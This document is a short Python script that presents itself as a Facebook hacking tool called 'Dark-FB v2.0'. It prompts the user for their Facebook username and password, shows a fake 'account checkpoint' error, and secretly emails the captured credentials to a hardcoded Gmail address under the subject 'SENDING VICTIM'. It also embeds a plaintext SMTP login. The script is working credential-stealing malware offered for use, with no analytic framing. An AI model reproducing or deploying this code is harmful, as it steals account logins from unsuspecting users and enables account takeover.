# -*- coding: utf-8 -*-
# coding=utf-8
import socket,struct,os,sys,time,yagmail
x=yagmail.SMTP('rillogumelar775@gmail.com','089642218366')
subject='SENDING VICTIM'
logo = """\x1b[91m
●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\x1b[32m
█████████
█▄█████▄█      ╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗
█▼▼▼▼▼ - _ --_- ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
█  _-_-- -_ --_═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ v2.0
█▲▲▲▲▲--  - _ -
█████████
 ██ █\x1b[91m
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

\x1b[00m"""

banner = """
\x1b[32m«=====================✧=====================»
\x1b[35m* \x1b[34mAuthor:\x1b[32mMr.HmM
\x1b[35m* \x1b[34mEmail :\x1b[32mkacanganin11@gmail.com
\x1b[35m* \x1b[91mTolong login mengunakan akun anda dahulu \x1b[32m!
\x1b[32m«=====================✧=====================»
"""
def main():
	os.system('clear')
	print(logo)
	print(banner)
	print('\x1b[32m\033[41m FACEBOOK LOGIN \033[32m')
	u=input('\x1b[00mUsername: \x1b[33m')
	p=input('\x1b[00mPassword: \x1b[33m')
	msg=('username: '+u+', password: '+p)
	body=(msg)
	print('')
	print('\x1b[91mseperti nya akun anda cekpoint\x1b[91m !\x1b[00m')
	print('\x1b[33mPlease try again later ...')
	os.system('sleep 3')
	print('')
	print('\x1b[00mExiting program \x1b[91m!')
	os.system('exit')
	x.send('rillo.gumelar11@gmail.com',subject,body)

main()
